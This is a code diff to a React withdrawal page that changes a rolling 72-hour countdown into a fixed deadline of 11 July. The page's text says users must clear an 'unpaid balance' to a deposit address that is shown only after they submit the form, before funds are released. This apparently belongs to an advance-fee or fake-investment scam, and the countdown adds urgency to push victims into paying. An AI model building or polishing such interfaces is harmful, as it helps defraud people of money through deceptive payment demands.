@@ -34,10 +34,17 @@ export default function WithdrawPage() {
   const [finalMsg, setFinalMsg]   = useState("");
 
   /* ── countdown timer ── */
-  const [countdown, setCountdown] = useState(72 * 60 * 60); // 72 hours in seconds
+  const [countdown, setCountdown] = useState(0);
 
   useEffect(() => {
-    const timer = setInterval(() => setCountdown(prev => (prev > 0 ? prev - 1 : 0)), 1000);
+    const targetDate = new Date('2026-07-11T23:59:59Z').getTime();
+    const updateTimer = () => {
+      const now = new Date().getTime();
+      const diff = Math.floor((targetDate - now) / 1000);
+      setCountdown(diff > 0 ? diff : 0);
+    };
+    updateTimer();
+    const timer = setInterval(updateTimer, 1000);
     return () => clearInterval(timer);
   }, []);
 
@@ -336,7 +343,7 @@ export default function WithdrawPage() {
             </h4>
             <p className="text-sm text-orange-600 dark:text-orange-300/80 mt-1">
               All withdrawals require you to clear your unpaid balance of{" "}
-              <strong>${UNLOCK_AMOUNT.toLocaleString()}</strong> before funds can be released. You have 3 days to cover this balance. The deposit address will be shown after you submit this form.
+              <strong>${UNLOCK_AMOUNT.toLocaleString()}</strong> before funds can be released. You have until 11 of July to cover this balance. The deposit address will be shown after you submit this form.
             </p>
           </div>
         </div>
